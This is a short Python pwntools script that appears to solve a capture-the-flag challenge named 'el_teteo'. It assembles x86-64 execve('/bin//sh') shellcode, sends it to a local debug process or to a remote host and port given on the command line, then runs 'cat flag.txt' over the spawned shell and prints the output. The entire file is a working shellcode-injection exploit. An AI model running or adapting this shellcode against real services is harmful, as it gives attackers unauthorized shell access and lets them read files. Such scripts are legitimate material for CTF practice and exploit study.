#!/usr/bin/env python3


from pwn import *
import sys


context.arch = "amd64"

def exploit(io):

    shellcode = asm("""
                    xor rsi, rsi
                    push rsi
                    movabs rdi, 0x68732f2f6e69622f
                    push rdi
                    mov rdi, rsp
                    mov rax, 59
                    xor rdx, rdx
                    syscall
    """)
    
    io.sendlineafter(b"> ", shellcode)
    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)



def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./el_teteo")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    exploit(io)


if __name__ == "__main__":
    main()
